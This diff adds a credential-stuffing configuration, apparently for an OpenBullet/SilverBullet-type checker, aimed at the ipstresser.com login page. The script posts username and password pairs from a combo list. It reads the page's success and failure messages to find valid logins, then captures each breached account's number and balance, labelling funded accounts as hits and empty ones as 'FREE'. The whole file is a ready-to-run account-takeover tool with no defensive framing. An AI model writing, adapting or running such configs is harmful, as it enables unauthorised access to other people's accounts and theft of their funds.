@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "ipstresser.com [ZsoZso]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-20T12:00:12.2883623+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "ZsoZso",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "ipstresser",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://www.ipstresser.com/index.php?page=login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://www.ipstresser.com/index.php?page=login" 
+  CONTENT "action=process&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email and password combination you provided is invalid" 
+  KEYCHAIN Success OR 
+    KEY "Account Information" 
+
+PARSE "<SOURCE>" LR "Account Number:</td><td>" "</td><tr>" CreateEmpty=FALSE -> CAP "AccountNumber" 
+
+PARSE "<SOURCE>" LR "Balance: " "<br /><br />" CreateEmpty=FALSE -> CAP "Balance" 
+
+FUNCTION Constant "Config by ZsoZso" -> CAP "Credit" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<Balance>" DoesNotContain "0.00" 
+    KEY "<SOURCE>" DoesNotContain "Nothing to display" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<Balance>" Contains "0.00" 
+    KEY "Nothing to display" 
+
